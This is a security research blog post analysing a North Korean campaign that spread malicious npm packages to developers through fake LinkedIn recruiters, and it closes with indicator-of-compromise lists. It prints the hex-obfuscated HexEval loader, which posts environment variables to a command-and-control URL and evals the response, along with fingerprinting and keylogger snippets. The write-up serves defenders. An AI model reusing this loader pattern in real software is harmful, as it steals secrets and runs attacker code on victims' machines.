---
title: "Another Wave: North Korean Contagious Interview Campaign Drops 35 New Malicious npm Packages"
short_title: "North Korean Contagious Interview Drops 35 Malicious npm Packages"
date: 2025-06-25 12:00:00 +0000
categories: [Malware, North Korea]
tags: [Contagious Interview, HexEval, BeaverTail, InvisibleFerret, npm, Typosquatting, Keylogger, LinkedIn, T1195.002, T1608.001, T1204.002, T1059.007, T1027.013, T1546.016, T1005, T1082, T1083, T1217, T1555.003, T1555.001, T1056.001, T1041, T1105, T1119, T1657]
canonical_url: https://socket.dev/blog/north-korean-contagious-interview-campaign-drops-35-new-malicious-npm-packages
source: Socket
image:
  path: https://cdn.sanity.io/images/cgdhsj6q/production/ab83d11cce4f0ca0e4fa4c251c9f02876900bb3b-1024x1024.webp
  alt: "North Korean Contagious Interview Campaign Drops 35 New Malicious npm Packages"
description: "North Korean threat actors linked to the Contagious Interview campaign return with 35 new malicious npm packages using a stealthy multi-stage malware loader."
---

The Socket Threat Research Team has uncovered an extended and ongoing North Korean supply chain attack that hides behind typosquatted npm packages. Threat actors linked to the Contagious Interview operation published 35 malicious packages across 24 npm accounts. Six remain live on the registry ([`react-plaid-sdk`](https://socket.dev/npm/package/react-plaid-sdk), [`sumsub-node-websdk`](https://socket.dev/npm/package/sumsub-node-websdk), [`vite-plugin-next-refresh`](https://socket.dev/npm/package/vite-plugin-next-refresh), [`vite-loader-svg`](https://socket.dev/npm/package/vite-loader-svg), [`node-orm-mongoose`](https://socket.dev/npm/package/node-orm-mongoose), and [`router-parse`](https://socket.dev/npm/package/router-parse)), and together have been downloaded over 4,000 times. We have petitioned the npm security team to remove the remaining live packages and suspend the associated accounts.

Each malicious package contains a hex-encoded loader we call HexEval. When the package installs, HexEval Loader collects host metadata, decodes its follow-on script, and, when triggered, fetches and runs BeaverTail, the infostealing second-stage malware linked to the Democratic People's Republic of Korea (DPRK) attackers. BeaverTail, in turn, references a third-stage backdoor InvisibleFerret, giving the threat actors layered control over the victim's machine. This nesting-doll structure helps the campaign evade basic static scanners and manual reviews. One npm alias also shipped a cross-platform keylogger package that captures every keystroke, showing the threat actors' readiness to tailor payloads for deeper surveillance when the target warrants it.

Posing as recruiters on LinkedIn, the North Korean threat actors send coding "assignments" to developers and job seekers via Google Docs, embed these malicious packages within the project, and often pressure candidates to run the code outside containerized environments while screen-sharing.

Earlier [campaigns](https://socket.dev/blog/lazarus-strikes-npm-again-with-a-new-wave-of-malicious-packages) embedded obfuscated BeaverTail directly in packages. Once security researchers [exposed](https://socket.dev/blog/north-korean-apt-lazarus-targets-developers-with-malicious-npm-package) that tactic, the threat group pivoted to HexEval Loader, which fetches BeaverTail on demand and leaves minimal evidence in the registry. We first [documented](https://socket.dev/blog/lazarus-expands-malicious-npm-campaign-11-new-packages-add-malware-loaders-and-bitbucket) this shift in April 2025, when the npm account `crouch626` published four malicious modules ([`cln-logger`](https://socket.dev/npm/package/cln-logger), [`node-clog`](https://socket.dev/npm/package/node-clog), [`consolidate-log`](https://socket.dev/npm/package/consolidate-log), and [`consolidate-logger`](https://socket.dev/npm/package/consolidate-logger)). The first two carried a HexEval Loader, whereas the others concealed an obfuscated copy of BeaverTail malware. Since then we have tracked dozens more packages, and believe the true count is higher because npm removed several shortly after publication. The campaign is still active, and we expect additional malicious packages to surface.

![Diamond model of intrusion analysis overview of the HexEval Loader campaign](https://cdn.sanity.io/images/cgdhsj6q/production/d3ac57ea4a82afd69f049867eed5951c3c5f3796-2048x1357.png)
_Diamond model of intrusion analysis overview of the HexEval Loader campaign, linking North Korean Contagious Interview threat actors (**Adversary**) to their C2 servers, npm accounts, and fake recruiter profiles (**Infrastructure**), the HexEval Loader, BeaverTail, InvisibleFerret, and a keylogger (**Capabilities**), and the targeted job-seekers and developers approached on LinkedIn (**Victim**)._

## Anatomy of a HexEval Loader

The threat actors follow a consistent naming and typosquatting playbook. They reuse well-known patterns such as `vite-plugin-*`, `react-*`, `*-logger`, `json*`, and typosquat popular projects, for example [`reactbootstraps`](https://socket.dev/npm/package/reactbootstraps/overview/1.0.0) masquerades as [`react-bootstrap`](https://socket.dev/npm/package/react-bootstrap) and [`react-plaid-sdk`](https://socket.dev/npm/package/react-plaid-sdk) echoes the legitimate [`react-plaid-link`](https://socket.dev/npm/package/react-plaid-link). Behind the familiar branding sits a compact malware loader (HexEval) that appears harmless on cursory review. The following [excerpt](https://socket.dev/npm/package/serverlog-dispatch/files/1.0.0/lib/private/prepare-writer.js#L3) from [`serverlog-dispatch`](https://socket.dev/npm/package/serverlog-dispatch/overview/1.0.0) illustrates the typical HexEval Loader pattern:

```javascript
// Decode a hex-encoded string at run time
function g(h) {
  return h.replace(/../g, m => String.fromCharCode(parseInt(m, 16)));
}

const hl = [
  g('72657175697265'), // require
  g('6178696f73'),     // axios
  g('706f7374'),       // post
  g('687474703a2f2f69702d636865636b2d7365727665722e76657263656c2e6170702f6170692f69702d636865636b2f323038'),
                       // C2 endpoint:
                       // hxxp://ip-check-server[.]vercel[.]app/api/ip-check/208
  g('7468656e')        // then
];

// Send environment data to the C2 endpoint, receive a script, then execute it
module.exports = () =>
  require(hl[1])[hl[2]](hl[3], { ...process.env })
                 [hl[4]](r => eval(r.data))
                 .catch(() => {});
```

To evade static analysis, the threat actors encode module names and C2 URLs as hexadecimal strings. The helper function `g` reverses this obfuscation by converting each two-character hex byte back into its ASCII representation. Once decoded, the loader issues an HTTPS POST request to its C2 server, retrieves a second-stage payload, and executes it by calling `eval()`. The operation in the identified packages alternates among three hardcoded C2 endpoints: `hxxps://log-server-lovat[.]vercel[.]app/api/ipcheck/703`, `hxxps://ip-check-server[.]vercel[.]app/api/ip-check/208`, and `hxxps://ip-check-api[.]vercel[.]app/api/ipcheck/703`. In at least one malicious packages cluster, a victim captured and analyzed the returned second-stage payload, confirming its malicious behavior. However, these endpoints often return only IP geolocation data or `undefined`, suggesting that the backend selectively serves malicious code based on request headers, execution environment, or other runtime conditions. This conditional logic complicates detection and raises important questions about how and when `eval(r.data)` executes its payload.

Several variants, including [`react-plaid-sdk`](https://socket.dev/npm/package/react-plaid-sdk), embed extra reconnaissance code in addition to the loader functionality, as shown in the following [excerpt](https://socket.dev/npm/package/react-plaid-sdk/files/2.0.15/lib/writer.js#L20):

```javascript
// Host fingerprinting
const data = {
  ...process.env,                     // Extract environment variables
  platform:   os.platform(),          // Operating system
  hostname:   os.hostname(),          // Machine host name
  username:   os.userInfo().username, // Current user account
  macAddresses: getMacAddress()       // MAC address for device fingerprinting
};
```

The npm alias [`jtgleason`](https://socket.dev/npm/user/jtgleason) also published [`jsonsecs`](https://socket.dev/npm/package/jsonsecs/overview/3.11.7), a package that supplements the HexEval Loader with a cross-platform keylogger, [enabling](https://socket.dev/npm/package/jsonsecs/files/3.11.7/build/index.js#L17) keystroke capture on Windows, macOS, and Linux systems when the threat actors require deeper surveillance.

```javascript
const os_1 = __importDefault(require("os"));          // Node's OS module
const MacKeyServer_1 = require("./ts/MacKeyServer");  // macOS keylogger
const WinKeyServer_1 = require("./ts/WinKeyServer");  // Windows keylogger
const X11KeyServer_1 = require("./ts/X11KeyServer");  // Linux/Unix keylogger
```

The `jsonsecs` package [includes](https://socket.dev/npm/package/jsonsecs/files/3.11.7/bin) compiled native binaries and exposes platform-specific keyboard hook functionality. Based on the operating system, it loads one of three binaries to hook into low-level input events:

- Windows: WinKeyServer (SHA256: `e58864cc22cd8ec17ae35dd810455d604aadab7c3f145b6c53b3c261855a4bb1`)
- macOS: MacKeyServer (SHA256: `30043996a56d0f6ad4ddb4186bd09ffc1050dcc352f641ce3907d35174086e15`)
- Linux: X11KeyServer (SHA256: `6e09249262d9a605180dfbd0939379bbf9f37db076980d6ffda98d650f70a16d`)

The system allows arbitrary handlers (listeners) to receive keystroke data, enabling exfiltration or real-time surveillance by the threat actors.

## Victim Profile: Developers and Engineers Seeking Work

The [`loveryon`](https://socket.dev/npm/user/loveryon) cluster (an npm alias that published [`serverlog-dispatch`](https://socket.dev/npm/package/serverlog-dispatch/overview/1.0.0), [`mongo-errorlog`](https://socket.dev/npm/package/mongo-errorlog/overview/1.0.0), [`next-log-patcher`](https://socket.dev/npm/package/next-log-patcher/overview/1.0.0), and [`vite-plugin-tools`](https://www.notion.so/Malicious-NPM-Package-naderabdi-merchant-advcash-Executes-Reverse-Shell-and-Abuses-Payment-Workflow-1bc4cb3adfeb8085b8b4d7340f5921d3?pvs=21)) exposes a well-orchestrated social-engineering routine that begins on LinkedIn. The threat actors posed as recruiters and approached software engineers with attractive job offers. After a brief exchange they sent coding tasks that instructed the candidates to clone test repositories and make minor changes. Buried in those projects was one of the [`loveryon`](https://socket.dev/npm/user/loveryon) cluster malicious dependencies carrying the HexEval Loader (or an inline `eval()` snippet) that triggered the moment the code ran.

![Reddit user describes uncovering malicious npm packages](https://cdn.sanity.io/images/cgdhsj6q/production/11e0bda6186d03a4cdaf8e5669f58d640f8dd569-910x361.png)

![Reddit user continues describing the attack](https://cdn.sanity.io/images/cgdhsj6q/production/e3de05ed5fe07cde44b5dff0a42c2879b8a3dbde-990x273.png)

![Reddit user shares details of the captured payload](https://cdn.sanity.io/images/cgdhsj6q/production/b041cf4279dbcb49c89328b7b84f0c725230daf2-953x257.png)
_A Reddit user [describes](https://www.reddit.com/r/CryptoScams/comments/1k37az4/comment/moflugs/) uncovering four malicious npm packages tied to the North Korean Contagious Interview operation. The threat actors posed as a recruiter on LinkedIn, lured the user into executing code locally, and attempted to exfiltrate data. Running the assignment in a containerized environment, the user [captured](https://gist.github.com/saurabhnemade/cf377389d34e8800b48afd505c7834fe) the second-stage payload delivered by the packages (`next-log-patcher`, `vite-plugin-tools`, `mongo-errorlog`, and `serverlog-dispatch`) and linked infrastructure._

## Second-Stage Payload: BeaverTail Malware

Once decoded, the HexEval Loader in the [`loveryon`](https://socket.dev/npm/user/loveryon) cluster [retrieved](https://gist.github.com/saurabhnemade/cf377389d34e8800b48afd505c7834fe) a second-stage payload (BeaverTail malware) from `172[.]86[.]80[.]145:1224` and executed it using `eval()`. We have previously [analyzed](https://socket.dev/blog/north-korean-apt-lazarus-targets-developers-with-malicious-npm-package) BeaverTail in depth. In brief, it functions as both an infostealer and a loader, designed for targeted data theft and persistent access. Upon execution, BeaverTail scans local file systems for browser artifacts across approximately 200 profile directories, including those associated with Brave, Chrome, and Opera. It searches for cookies, IndexedDB files, and extensions such as `.log` and `.ldb` that may contain sensitive data. BeaverTail also targets cryptocurrency wallets, attempting to extract files like Solana's `id.json`, Exodus wallet data, and macOS keychain databases. Its behavior dynamically adjusts based on the host operating system (Windows, macOS, or Linux).

The version identified in the [`loveryon`](https://socket.dev/npm/user/loveryon) cluster also includes logic to retrieve a third-stage backdoor, InvisibleFerret. Using either `curl` or the Node.js `request` module, BeaverTail [downloads](https://socket.dev/blog/lazarus-strikes-npm-again-with-a-new-wave-of-malicious-packages) additional payloads, such as InvisibleFerret, under e.g. `p.zi` or `p2.zip` filenames, which are extracted using `tar -xf`. This multi-stage deployment mirrors previously [observed](https://socket.dev/blog/lazarus-expands-malicious-npm-campaign-11-new-packages-add-malware-loaders-and-bitbucket) campaigns tied to North Korean threat actors using the same malware family.

## Initial Access via Social Engineering

The intrusion begins with social engineering. According multiple victims' [reports](https://www.reddit.com/r/programming/comments/1i84akt/recruiter_tried_to_hack_me_full_story_on_comments/), North Korean threat actors create fake recruiter profiles on LinkedIn to impersonate hiring professionals from recruitment companies. They target software engineers who are actively job-hunting, exploiting the trust that job-seekers typically place in recruiters. Fake personas initiate contact, often with scripted outreach messages and convincing job descriptions.

The threat actors used 19 distinct email addresses to register the npm accounts behind the 35 malicious packages uncovered in this campaign (see IOC section for the full list). Several of these addresses (e.g. `maria.sam.recruiter@gmail[.]com`, `toptalent0921@gmail[.]com`, and `business00747@gmail[.]com`) appear crafted to mimic recruiter identities. The threat actors likely created or used these email accounts alongside fake recruiter profiles as part of their broader social engineering campaign. By posing as hiring managers or technical recruiters, the threat actors exploited job-seeking behavior to build trust and increase the likelihood that targets would install and run the malicious code.

After initial communication, the threat actors send victims a technical assessment or coding assignment under the guise of a hiring process. In several cases, once the malicious code is delivered, the fake recruiters delete their LinkedIn profiles or block the victim, cutting off contact to cover tracks. Victim [reports](https://www.reddit.com/r/programming/comments/1i84akt/recruiter_tried_to_hack_me_full_story_on_comments/) on Reddit consistently describe the same pattern, noting similar job descriptions and identical communication scripts across different recruiter personas.

![Reddit users report coordinated social engineering](https://cdn.sanity.io/images/cgdhsj6q/production/d75c7df4e2fed7ff1fc1f382c961ddc2990f47ce-982x514.png)
_Reddit users [report](https://www.reddit.com/r/programming/comments/1i84akt/recruiter_tried_to_hack_me_full_story_on_comments/) coordinated social engineering involving a fake recruiter who directed targets to clone and run a Bitbucket-hosted project locally. After execution, the recruiter deleted their account._

The assignments direct victims to clone code repositories or install specific npm packages (both of which deliver malicious JavaScript payloads). In this campaign, the payload is the HexEval Loader, designed to fingerprint the host and retrieve second-stage malware. Once a victim submits the completed assignment, the threat actors often escalate their tactics. They may request a live video call with a "project manager", during which they pressure the victim to disable Docker or other container environments and run the code natively on their machine while screen sharing — an attempt to bypass container isolation and ensure full infection.

![Threat actor pressures target to bypass containerized environments](https://cdn.sanity.io/images/cgdhsj6q/production/db5aca759efb61e7976fc3986c1a05af0aaabc04-1000x1150.png)
_A threat actor, posing as a recruiter on LinkedIn, [pressures](https://www.reddit.com/r/CryptoScams/comments/1k37az4/comment/moflugs/) the target to bypass containerized environments and execute code directly on the host system._

Multiple victims [report](https://www.reddit.com/r/programming/comments/1i84akt/recruiter_tried_to_hack_me_full_story_on_comments/) this exact sequence. On Reddit, one developer [described](https://www.reddit.com/r/programming/comments/1i84akt/recruiter_tried_to_hack_me_full_story_on_comments/) being asked to "clone it again for a new update and run the app without Docker on a real machine while sharing my screen". This tactic reflects a deliberate effort to ensure execution in a vulnerable context.

Victims are approached with lucrative job offers, often advertising remote roles with salaries ranging from $16,000 to $25,000 per month ($192,000 to $300,000 per year). The job descriptions are shared via [Google Docs](https://www.reddit.com/r/programming/comments/1i84akt/comment/mdedtiy/?utm_source=share&utm_medium=web3x&utm_name=web3xcss&utm_term=1&utm_content=share_button) or PDFs and are crafted to resemble legitimate listings for positions such as developers, designers, engineers, or project managers.

![Fraudulent Google Doc job description](https://cdn.sanity.io/images/cgdhsj6q/production/81f456f7d07a29a49ad1077b4df45b47361cd526-1586x872.png)
_Screenshot of a fraudulent Google Doc job description used by threat actors to lure blockchain developers with fake remote positions; part of a broader social engineering campaign targeting software engineers._

![Fraudulent coding assignment on Google Docs](https://cdn.sanity.io/images/cgdhsj6q/production/c9e906afb7460c8a9183f9b2bc02850be24ccb0e-1597x922.png)
_Screenshot of a fraudulent coding assignment hosted on Google Docs, instructing blockchain developers to interact with a Bitbucket repository (`notion-dex/ultrax`) as part of a fake recruitment process._

The targeting appears to follow prior open source intelligence (OSINT) collection. In several cases, the fake recruiters reference specific GitHub projects, past experience, and personal details, suggesting a deliberate effort to personalize the outreach and boost credibility. Once the victim engages, malicious npm packages are discreetly introduced, either embedded in the assignment codebase or added as hidden dependencies. This initiates host reconnaissance and sets the stage for follow-on intrusions and malware execution.

## Outlook and Recommendations

This malicious campaign highlights an evolving tradecraft in North Korean supply chain attacks, one that blends malware staging, OSINT-driven targeting, and social engineering to compromise developers through trusted ecosystems. By embedding malware loaders like HexEval in open source packages and delivering them through fake job assignments, threat actors sidestep perimeter defenses and gain execution on the systems of targeted developers. The campaign's multi-stage structure, minimal on-registry footprint, and attempt to evade containerized environments point to a well-resourced adversary refining its intrusion methods in real time.

Defenders should expect continued infiltration of public registries like npm, especially through typosquatting and delayed second-stage delivery mechanisms. Given the success of this approach, similar nation-state and criminal threat actors may emulate these tactics.

To defend against sophisticated supply chain attacks like the Contagious Interview campaign, developers and organizations must adopt proactive security tooling that detects threats before they reach production systems. Traditional static analysis and package metadata checks are no longer sufficient when attackers weaponize social engineering and hide malware in seemingly legitimate open source packages.

Socket provides purpose-built defenses to meet these challenges. The [Socket GitHub App](https://socket.dev/features/github) offers real-time pull request scanning, alerting teams to suspicious or malicious dependencies before they are merged. The [Socket CLI](https://socket.dev/features/cli) surfaces red flags during `npm install`, giving developers immediate insight into the risks of packages introduced at the terminal. And the [Socket browser extension](https://chromewebstore.google.com/detail/socket-security/jbcobpbfgkhmjfpjjepkcocalmpkiaop?pli=1) adds a critical layer of defense by warning users when they visit or download malicious packages from package managers.

## Indicators of Compromise (IOCs)

## Malicious npm Packages

1. [`react-plaid-sdk`](https://socket.dev/npm/package/react-plaid-sdk)
1. [`sumsub-node-websdk`](https://socket.dev/npm/package/sumsub-node-websdk)
1. [`vite-plugin-next-refresh`](https://socket.dev/npm/package/vite-plugin-next-refresh)
1. [`vite-plugin-purify`](https://socket.dev/npm/package/vite-plugin-purify)
1. [`nextjs-insight`](https://socket.dev/npm/package/nextjs-insight)
1. [`vite-plugin-svgn`](https://socket.dev/npm/package/vite-plugin-svgn)
1. [`node-loggers`](https://socket.dev/npm/package/node-loggers)
1. [`react-logs`](https://socket.dev/npm/package/react-logs)
1. [`reactbootstraps`](https://socket.dev/npm/package/reactbootstraps)
1. [`framer-motion-ext`](https://socket.dev/npm/package/framer-motion-ext)
1. [`serverlog-dispatch`](https://socket.dev/npm/package/serverlog-dispatch)
1. [`mongo-errorlog`](https://socket.dev/npm/package/mongo-errorlog)
1. [`next-log-patcher`](https://socket.dev/npm/package/next-log-patcher)
1. [`vite-plugin-tools`](https://socket.dev/npm/package/vite-plugin-tools)
1. [`pixel-percent`](https://socket.dev/npm/package/pixel-percent)
1. [`test-topdev-logger-v1`](https://socket.dev/npm/package/test-topdev-logger-v1)
1. [`test-topdev-logger-v3`](https://socket.dev/npm/package/test-topdev-logger-v3)
1. [`server-log-engine`](https://socket.dev/npm/package/server-log-engine)
1. [`logbin-nodejs`](https://socket.dev/npm/package/logbin-nodejs)
1. [`vite-loader-svg`](https://socket.dev/npm/package/vite-loader-svg)
1. [`struct-logger`](https://socket.dev/npm/package/struct-logger)
1. [`flexible-loggers`](https://socket.dev/npm/package/flexible-loggers)
1. [`beautiful-plugins`](https://socket.dev/npm/package/beautiful-plugins)
1. [`chalk-config`](https://socket.dev/npm/package/chalk-config)
1. [`jsonpacks`](https://socket.dev/npm/package/jsonpacks)
1. [`jsonspecific`](https://socket.dev/npm/package/jsonspecific)
1. [`jsonsecs`](https://socket.dev/npm/package/jsonsecs)
1. [`util-buffers`](https://socket.dev/npm/package/util-buffers)
1. [`blur-plugins`](https://socket.dev/npm/package/blur-plugins)
1. [`proc-watch`](https://socket.dev/npm/package/proc-watch)
1. [`node-orm-mongoose`](https://socket.dev/npm/package/node-orm-mongoose)
1. [`prior-config`](https://socket.dev/npm/package/prior-config)
1. [`use-videos`](https://socket.dev/npm/package/use-videos)
1. [`lucide-node`](https://socket.dev/npm/package/lucide-node)
1. [`router-parse`](https://socket.dev/npm/package/router-parse)

## Threat Actor Identifiers

**npm Aliases:**

1. `liamnevin`
1. `pablomendes`
1. `bappda`
1. `jvinter97`
1. `eric.c01`
1. `maryanaaaa`
1. `npmdev001`
1. `loveryon`
1. `supermmm`
1. `topdev0921`
1. `hansdev0512`
1. `abdulrahman_nasser`
1. `marsinc326`
1. `cristoper52`
1. `shauncepla`
1. `marthamoon014`
1. `jtgleason`
1. `grace107`
1. `business00747`
1. `supercrazybug`
1. `alexander0110819`
1. `purpledev07`
1. `mariasam`
1. `oleksandrrozgon`

**Email Addresses**

1. `alexander0110819@outlook[.]com`
1. `maria.sam.recruiter@gmail[.]com`
1. `toptalent0921@gmail[.]com`
1. `business00747@gmail[.]com`
1. `eric.c01.recruit@gmail[.]com`
1. `hiring.dev.hr@gmail[.]com`
1. `carrie.bale.recruit@gmail[.]com`
1. `emilyjobs.rec2023@gmail[.]com`
1. `mars.recruiting.hiring@gmail[.]com`
1. `shauncepla.hrteam@gmail[.]com`
1. `grace.chen.recruitment@gmail[.]com`
1. `grace107jobs@gmail[.]com`
1. `abdulrahman.nasser.hr@gmail[.]com`
1. `marthamoon014@gmail[.]com`
1. `sofia.helman@outlook[.]com`
1. `supercrazybug.team@gmail[.]com`
1. `maryanaaaa.hrteam@gmail[.]com`
1. `topdev0921@gmail[.]com`
1. `natalie.dev.hr@gmail[.]com`

## Malicious Bitbucket Repositories

- `hxxps://bitbucket[.]org/notion-dex/ultrax`
- `hxxps://bitbucket[.]org/zoro-workspace/`

## Command and Control (C2) Endpoints

- `hxxps://log-server-lovat[.]vercel[.]app/api/ipcheck/703`
- `hxxps://ip-check-server[.]vercel[.]app/api/ip-check/208`
- `hxxps://ip-check-api[.]vercel[.]app/api/ipcheck/703`
- `172[.]86[.]80[.]145`

## SHA256 Hashes

- `e58864cc22cd8ec17ae35dd810455d604aadab7c3f145b6c53b3c261855a4bb1` — WinKeyServer
- `30043996a56d0f6ad4ddb4186bd09ffc1050dcc352f641ce3907d35174086e15` — MacKeyServer
- `6e09249262d9a605180dfbd0939379bbf9f37db076980d6ffda98d650f70a16d` — X11KeyServer

## MITRE ATT&CK Techniques

- T1195.002 — Supply Chain Compromise: Compromise Software Supply Chain
- T1608.001 — Stage Capabilities: Upload Malware
- T1204.002 — User Execution: Malicious File
- T1059.007 — Command and Scripting Interpreter: JavaScript
- T1027.013 — Obfuscated Files or Information: Encrypted/Encoded File
- T1546.016 — Event Triggered Execution: Installer Packages
- T1005 — Data from Local System
- T1082 — System Information Discovery
- T1083 — File and Directory Discovery
- T1217 — Browser Information Discovery
- T1555.003 — Credentials from Password Stores: Credentials from Web Browsers
- T1555.001 — Credentials from Password Stores: Keychain
- T1056.001 — Input Capture: Keylogging
- T1041 — Exfiltration Over C2 Channel
- T1105 — Ingress Tool Transfer
- T1119 — Automated Collection
- T1657 — Financial Theft
